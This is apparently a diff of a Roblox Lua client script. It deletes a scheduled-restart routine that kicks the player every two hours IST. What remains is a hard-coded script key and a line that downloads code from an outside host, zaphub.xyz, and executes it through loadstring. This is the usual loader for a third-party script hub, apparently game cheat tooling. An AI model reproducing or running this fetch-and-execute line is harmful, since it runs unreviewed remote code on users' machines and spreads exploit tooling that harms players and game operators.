@@ -1,27 +1,4 @@
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
 
--- Scheduled kick every 2 hours (IST)
-task.spawn(function()
-    local kickHours = {
-        [0] = true, [2] = true, [4] = true, [6] = true,
-        [8] = true, [10] = true, [12] = true, [14] = true,
-        [16] = true, [18] = true, [20] = true, [22] = true
-    }
-
-    while true do
-        local utc = os.time()
-        local ist = os.date("*t", utc + 19800) -- UTC+5:30
-
-        -- First 2 minutes of the restart hour
-        if kickHours[ist.hour] and ist.min <= 2 then
-            player:Kick("Scheduled restart")
-            break
-        end
-
-        task.wait(30)
-    end
-end)
 
 script_key = "wUyvmjsmuvRIwOPwLszkupgIOvvIkoYq"
 loadstring(game:HttpGet("https://zaphub.xyz/Exec"))()
